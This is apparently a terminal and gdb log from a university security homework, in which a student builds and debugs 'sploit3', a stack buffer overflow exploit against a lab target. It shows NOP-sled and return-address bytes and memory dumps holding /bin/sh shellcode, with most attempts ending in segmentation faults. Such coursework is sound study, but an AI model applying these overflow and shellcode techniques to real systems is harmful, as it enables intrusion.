0xbffffdf4:	0x080484c0	0xbfffff98	0xbffffe08	0x080484fb
0xbffffe04:	0xbfffff98	0x00000000	0xb7e21637	0x00000002
0xbffffe14:	0xbffffea4	0xbffffeb0	0x00000000	0x00000000
0xbffffe24:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe34:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe44:	0x73cc2d87	0x481be397	0x00000000	0x00000000
0xbffffe54:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffe64:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffffe74:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffffe84:	0x00000002	0xbffffea4	0x08048510	0x08048570
0xbffffe94:	0xb7fea880	0xbffffe9c	0xb7fff918	0x00000002
0xbffffea4:	0xbfffff8b	0xbfffff98	0x00000000	0xbfffff9d
0xbffffeb4:	0xbfffffdd	0xbfffffea	0x00000000	0x00000020
0xbffffec4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) q
A debugging session is active.

	Inferior 1 [process 2734] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ls
shellcode.h  sploit0.c  sploit1.c  sploit2.c  sploit3.c  sploitEC.c
sploit0      sploit1    sploit2    sploit3    sploit4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2782 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff8e "\220\220\220\220\220\241\377\377\277") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff8e "\220\220\220\220\220\241\377\377\277"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) x/64x 0xbffffdf4-32
0xbffffdd4:	0x00000000	0xb7e37a50	0x0804855b	0x00000002
0xbffffde4:	0xbffffea4	0xbffffeb0	0x08048531	0xbffffdfc
0xbffffdf4:	0x080484c0	0xbfffff8e	0xbffffe08	0x080484fb
0xbffffe04:	0xbfffff8e	0x00000000	0xb7e21637	0x00000002
0xbffffe14:	0xbffffea4	0xbffffeb0	0x00000000	0x00000000
0xbffffe24:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe34:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe44:	0xe18b6725	0xda5ca935	0x00000000	0x00000000
0xbffffe54:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffe64:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffffe74:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffffe84:	0x00000002	0xbffffea4	0x08048510	0x08048570
0xbffffe94:	0xb7fea880	0xbffffe9c	0xb7fff918	0x00000002
0xbffffea4:	0xbfffff81	0xbfffff8e	0x00000000	0xbfffff98
0xbffffeb4:	0xbfffffd8	0xbfffffe5	0x00000000	0x00000020
0xbffffec4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) n
10	}
(gdb) x/64x 0xbffffdf4-32
0xbffffdd4:	0xbffffde0	0xbfffff8e	0x00000014	0x90909090
0xbffffde4:	0xffffa190	0x687300bf	0x636c6c65	0x3d65646f
0xbffffdf4:	0x080484c0	0xbfffff8e	0xbffffe08	0x080484fb
0xbffffe04:	0xbfffff8e	0x00000000	0xb7e21637	0x00000002
0xbffffe14:	0xbffffea4	0xbffffeb0	0x00000000	0x00000000
0xbffffe24:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffe34:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffe44:	0xe18b6725	0xda5ca935	0x00000000	0x00000000
0xbffffe54:	0x00000000	0x00000002	0x080483a0	0x00000000
0xbffffe64:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000002
0xbffffe74:	0x080483a0	0x00000000	0x080483c1	0x080484c6
0xbffffe84:	0x00000002	0xbffffea4	0x08048510	0x08048570
0xbffffe94:	0xb7fea880	0xbffffe9c	0xb7fff918	0x00000002
0xbffffea4:	0xbfffff81	0xbfffff8e	0x00000000	0xbfffff98
0xbffffeb4:	0xbfffffd8	0xbfffffe5	0x00000000	0x00000020
0xbffffec4:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) x/x $ebp
0xbffffdf0:	0x3d65646f
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x080484af	0xbffffde0	0xbfffff8e	0x00000014
0xbffffde0:	0x90909090	0xffffa190	0x687300bf	0x636c6c65
0xbffffdf0:	0x3d65646f	0x080484c0	0xbfffff8e	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff8e	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0xe18b6725	0xda5ca935	0x00000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 2782] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
sploit3.c: In function ‘main’:
sploit3.c:16:18: warning: initialization makes integer from pointer without a cast [-Wint-conversion]
   char address = "\x90\x90\x90\x90\x90";
                  ^
sploit3.c:18:18: warning: passing argument 2 of ‘strcat’ makes pointer from integer without a cast [-Wint-conversion]
   strcat(result, address);
                  ^
In file included from sploit3.c:4:0:
/usr/include/string.h:133:14: note: expected ‘const char * restrict’ but argument is of type ‘char’
 extern char *strcat (char *__restrict __dest, const char *__restrict __src)
              ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
sploit3.c: In function ‘main’:
sploit3.c:16:18: warning: initialization makes integer from pointer without a cast [-Wint-conversion]
   char address = "\x90\x90\x90\x90\x90";
                  ^
sploit3.c:18:18: warning: passing argument 2 of ‘strcat’ makes pointer from integer without a cast [-Wint-conversion]
   strcat(result, address);
                  ^
In file included from sploit3.c:4:0:
/usr/include/string.h:133:14: note: expected ‘const char * restrict’ but argument is of type ‘char’
 extern char *strcat (char *__restrict __dest, const char *__restrict __src)
              ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852c: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
__strcat_sse2 () at ../sysdeps/i386/i686/multiarch/strcat-sse2.S:98
98	../sysdeps/i386/i686/multiarch/strcat-sse2.S: No such file or directory.
(gdb) n

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
sploit3.c: In function ‘main’:
sploit3.c:16:18: warning: initialization makes integer from pointer without a cast [-Wint-conversion]
   char address = "\xa1\xff\xff\xbf";
                  ^
sploit3.c:18:18: warning: passing argument 2 of ‘strcat’ makes pointer from integer without a cast [-Wint-conversion]
   strcat(result, address);
                  ^
In file included from sploit3.c:4:0:
/usr/include/string.h:133:14: note: expected ‘const char * restrict’ but argument is of type ‘char’
 extern char *strcat (char *__restrict __dest, const char *__restrict __src)
              ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
sploit3.c: In function ‘main’:
sploit3.c:16:18: warning: initialization makes integer from pointer without a cast [-Wint-conversion]
   char address = "\xa1\xff\xff\xbf";
                  ^
sploit3.c:18:18: warning: passing argument 2 of ‘strcat’ makes pointer from integer without a cast [-Wint-conversion]
   strcat(result, address);
                  ^
In file included from sploit3.c:4:0:
/usr/include/string.h:133:14: note: expected ‘const char * restrict’ but argument is of type ‘char’
 extern char *strcat (char *__restrict __dest, const char *__restrict __src)
              ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) strcat(result, address);Quit
(gdb) Quit
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2923 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff96 "\241\377\377\277\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff96 "\241\377\377\277\220"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) Quitfffdf4
(gdb) x/32x 0xbffffdf0-16
0xbffffde0:	0x00000002	0xbffffea4	0xbffffeb0	0x08048531
0xbffffdf0:	0xbffffdfc	0x080484c0	0xbfffff96	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff96	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x2071552d	0x1ba69b3d	0x00000000
0xbffffe50:	0x00000000	0x00000000	0x00000002	0x080483a0
(gdb) n
10	}
(gdb) x/32x 0xbffffdf0-16
0xbffffde0:	0xbfffffa1	0x68730090	0x636c6c65	0x3d65646f
0xbffffdf0:	0xdb31c031	0x080484c0	0xbfffff96	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff96	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x2071552d	0x1ba69b3d	0x00000000
0xbffffe50:	0x00000000	0x00000000	0x00000002	0x080483a0
(gdb) x/2xw $esp
0xbffffde0:	0xbfffffa1	0x68730090
(gdb) x/2xw $ebp
0xbffffdf0:	0xdb31c031	0x080484c0
(gdb) n
foo (values=<error reading variable: Cannot access memory at address 0xdb31c039>) at target3.c:15
15	}
(gdb) q
A debugging session is active.

	Inferior 1 [process 2923] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) n
16	  char *address = "\x90\x90\x90\x90";
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2996 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) b9
Undefined command: "b9".  Try "help".
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff90 "\220\220\220\220\241\377\377\277") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff90 "\220\220\220\220\241\377\377\277"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) x/32x 0xbffffdf0-16
0xbffffde0:	0x00000002	0xbffffea4	0xbffffeb0	0x08048531
0xbffffdf0:	0xbffffdfc	0x080484c0	0xbfffff90	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff90	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x3abef7fa	0x016939ea	0x00000000
0xbffffe50:	0x00000000	0x00000000	0x00000002	0x080483a0
(gdb) n
10	}
(gdb) x/32x 0xbffffdf0-16
0xbffffde0:	0x90909090	0xbfffffa1	0x65687300	0x6f636c6c
0xbffffdf0:	0x313d6564	0x080484c0	0xbfffff90	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff90	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x3abef7fa	0x016939ea	0x00000000
0xbffffe50:	0x00000000	0x00000000	0x00000002	0x080483a0
(gdb) q
A debugging session is active.

	Inferior 1 [process 2996] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3041 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff96 "\220\220\220\220\241") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff96 "\220\220\220\220\241"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffde0:	0x00000002	0xbffffea4	0xbffffeb0	0x08048531
0xbffffdf0:	0xbffffdfc	0x080484c0	0xbfffff96	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff96	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x7a8e89d5	0x415947c5	0x00000000
(gdb) n
10	}
(gdb) n
foo (values=<error reading variable: Cannot access memory at address 0xdb31c039>) at target3.c:15
15	}
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x080484af	0xbffffde0	0xbfffff96	0x00000014
0xbffffde0:	0x90909090	0x687300a1	0x636c6c65	0x3d65646f
0xbffffdf0:	0xdb31c031	0x080484c0	0xbfffff96	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff96	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x7a8e89d5	0x415947c5	0x00000000
(gdb) x/32x 0xbffffda1-32
0xbffffd81:	0x00bffffd	0x50b7fff0	0x00080482	0x00000000
0xbffffd91:	0x18b7fff0	0x58b7fff9	0x84b7e11b	0x00080482
0xbffffda1:	0xeb000000	0x00b7fe97	0x00000000	0x00b7fbb0
0xbffffdb1:	0xf0b7fbb0	0x10bffffd	0x34b7ff00	0x80bffffe
0xbffffdc1:	0xe0b7f2fd	0x9dbffffd	0x00b7f2fd	0xaf000000
0xbffffdd1:	0xe0080484	0x96bffffd	0x14bfffff	0x90000000
0xbffffde1:	0xa1909090	0x65687300	0x6f636c6c	0x313d6564
0xbffffdf1:	0xc0db31c0	0x96080484	0x08bfffff	0xfbbffffe
(gdb) x/32x 0xbfffffa1-32
0xbfffff81:	0x00000000	0x00000000	0x706d742f	0x7261742f
0xbfffff91:	0x33746567	0x90909000	0x7300a190	0x6c6c6568
0xbfffffa1:	0x65646f63	0x31c0313d	0xcd17b0db	0x5e1feb80
0xbfffffb1:	0x31087689	0x074688c0	0xb00c4689	0x8df3890b
0xbfffffc1:	0x568d084e	0x3180cd0c	0x40d889db	0xdce880cd
0xbfffffd1:	0x2fffffff	0x2f6e6962	0x2f006873	0x2f706d74
0xbfffffe1:	0x67726174	0x00337465	0x90909090	0x742f00a1
0xbffffff1:	0x742f706d	0x65677261	0x00003374	Cannot access memory at address 0xc0000000
(gdb) x/32x 0xbfffffa5-32
0xbfffff85:	0x00000000	0x706d742f	0x7261742f	0x33746567
0xbfffff95:	0x90909000	0x7300a190	0x6c6c6568	0x65646f63
0xbfffffa5:	0x31c0313d	0xcd17b0db	0x5e1feb80	0x31087689
0xbfffffb5:	0x074688c0	0xb00c4689	0x8df3890b	0x568d084e
0xbfffffc5:	0x3180cd0c	0x40d889db	0xdce880cd	0x2fffffff
0xbfffffd5:	0x2f6e6962	0x2f006873	0x2f706d74	0x67726174
0xbfffffe5:	0x00337465	0x90909090	0x742f00a1	0x742f706d
0xbffffff5:	0x65677261	0x00003374	Cannot access memory at address 0xc0000000
(gdb) x/32x 0xbfffffa4-32
0xbfffff84:	0x00000000	0x6d742f00	0x61742f70	0x74656772
0xbfffff94:	0x90900033	0x00a19090	0x6c656873	0x646f636c
0xbfffffa4:	0xc0313d65	0x17b0db31	0x1feb80cd	0x0876895e
0xbfffffb4:	0x4688c031	0x0c468907	0xf3890bb0	0x8d084e8d
0xbfffffc4:	0x80cd0c56	0xd889db31	0xe880cd40	0xffffffdc
0xbfffffd4:	0x6e69622f	0x0068732f	0x706d742f	0x7261742f
0xbfffffe4:	0x33746567	0x90909000	0x2f00a190	0x2f706d74
0xbffffff4:	0x67726174	0x00337465	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/32x 0xbfffffa1-32
0xbfffff81:	0x00000000	0x00000000	0x706d742f	0x7261742f
0xbfffff91:	0x33746567	0x90909000	0x7300a190	0x6c6c6568
0xbfffffa1:	0x65646f63	0x31c0313d	0xcd17b0db	0x5e1feb80
0xbfffffb1:	0x31087689	0x074688c0	0xb00c4689	0x8df3890b
0xbfffffc1:	0x568d084e	0x3180cd0c	0x40d889db	0xdce880cd
0xbfffffd1:	0x2fffffff	0x2f6e6962	0x2f006873	0x2f706d74
0xbfffffe1:	0x67726174	0x00337465	0x90909090	0x742f00a1
0xbffffff1:	0x742f706d	0x65677261	0x00003374	Cannot access memory at address 0xc0000000
(gdb) x/32x 0xbfffff9f-32
0xbfffff7f:	0x00000000	0x00000000	0x742f0000	0x742f706d
0xbfffff8f:	0x65677261	0x90003374	0xa1909090	0x65687300
0xbfffff9f:	0x6f636c6c	0x313d6564	0xb0db31c0	0xeb80cd17
0xbfffffaf:	0x76895e1f	0x88c03108	0x46890746	0x890bb00c
0xbfffffbf:	0x084e8df3	0xcd0c568d	0x89db3180	0x80cd40d8
0xbfffffcf:	0xffffdce8	0x69622fff	0x68732f6e	0x6d742f00
0xbfffffdf:	0x61742f70	0x74656772	0x90900033	0x00a19090
0xbfffffef:	0x706d742f	0x7261742f	0x33746567	0x00000000
(gdb) x/32x 0xbfffffa7-32
0xbfffff87:	0x742f0000	0x742f706d	0x65677261	0x90003374
0xbfffff97:	0xa1909090	0x65687300	0x6f636c6c	0x313d6564
0xbfffffa7:	0xb0db31c0	0xeb80cd17	0x76895e1f	0x88c03108
0xbfffffb7:	0x46890746	0x890bb00c	0x084e8df3	0xcd0c568d
0xbfffffc7:	0x89db3180	0x80cd40d8	0xffffdce8	0x69622fff
0xbfffffd7:	0x68732f6e	0x6d742f00	0x61742f70	0x74656772
0xbfffffe7:	0x90900033	0x00a19090	0x706d742f	0x7261742f
0xbffffff7:	0x33746567	0x00000000	Cannot access memory at address 0xc0000000
(gdb) x/32x 0xbfffffa6-32
0xbfffff86:	0x2f000000	0x2f706d74	0x67726174	0x00337465
0xbfffff96:	0x90909090	0x687300a1	0x636c6c65	0x3d65646f
0xbfffffa6:	0xdb31c031	0x80cd17b0	0x895e1feb	0xc0310876
0xbfffffb6:	0x89074688	0x0bb00c46	0x4e8df389	0x0c568d08
0xbfffffc6:	0xdb3180cd	0xcd40d889	0xffdce880	0x622fffff
0xbfffffd6:	0x732f6e69	0x742f0068	0x742f706d	0x65677261
0xbfffffe6:	0x90003374	0xa1909090	0x6d742f00	0x61742f70
0xbffffff6:	0x74656772	0x00000033	Cannot access memory at address 0xc0000000
(gdb) q
A debugging session is active.

	Inferior 1 [process 3041] will be killed.

Quit anyway? (y or n) 
Please answer y or n.
A debugging session is active.

	Inferior 1 [process 3041] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ ./sploit3
Segmentation fault (core dumped)
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3088 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff96 "\220\220\220\220\246") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff96 "\220\220\220\220\246"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x00000002	0x00000000	0xb7e37a50	0x0804855b
0xbffffde0:	0x00000002	0xbffffea4	0xbffffeb0	0x08048531
0xbffffdf0:	0xbffffdfc	0x080484c0	0xbfffff96	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff96	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x800d1a51	0xbbdad441	0x00000000
(gdb) n
10	}
(gdb) x/32x 0xbffffdf0-32
0xbffffdd0:	0x080484af	0xbffffde0	0xbfffff96	0x00000014
0xbffffde0:	0x90909090	0x687300a6	0x636c6c65	0x3d65646f
0xbffffdf0:	0xdb31c031	0x080484c0	0xbfffff96	0xbffffe08
0xbffffe00:	0x080484fb	0xbfffff96	0x00000000	0xb7e21637
0xbffffe10:	0x00000002	0xbffffea4	0xbffffeb0	0x00000000
0xbffffe20:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffffe30:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffe40:	0x00000000	0x800d1a51	0xbbdad441	0x00000000
(gdb) x/x $ebp
0xbffffdf0:	0xdb31c031
(gdb) x/x $esp
0xbffffde0:	0x90909090
(gdb) x/x $eip
0x80484b2 <copyFourInts+23>:	0x55c3c990
(gdb) x/x 0xbffffdf4
0xbffffdf4:	0x080484c0
(gdb) n
foo (values=<error reading variable: Cannot access memory at address 0xdb31c039>) at target3.c:15
15	}
(gdb) q
A debugging session is active.

	Inferior 1 [process 3088] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit3.c -o sploit3
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit3
Reading symbols from sploit3...done.
(gdb) break main
Breakpoint 1 at 0x804852d: file sploit3.c, line 11.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit3 

Breakpoint 1, main () at sploit3.c:11
11	{
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) c
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 3133 is executing new program: /tmp/target3

Breakpoint 1, main (argc=2, argv=0xbffffea4) at target3.c:19
19	  if( argc != 2 )
(gdb) b 9
Breakpoint 3 at 0x80484a1: file target3.c, line 9.
(gdb) c
Continuing.

Breakpoint 3, copyFourInts (values=0xbfffff96 "\220\220\220\220\220") at target3.c:9
9	  memcpy((char*)intvalues, values, sizeof(int)*5);
(gdb) info frame
Stack level 0, frame at 0xbffffdf8:
 eip = 0x80484a1 in copyFourInts (target3.c:9); saved eip = 0x80484c0
 called by frame at 0xbffffe04
 source language c.
 Arglist at 0xbffffdf0, args: values=0xbfffff96 "\220\220\220\220\220"
 Locals at 0xbffffdf0, Previous frame's sp is 0xbffffdf8
 Saved registers:
  ebp at 0xbffffdf0, eip at 0xbffffdf4
(gdb) 0xbffffdf0-32
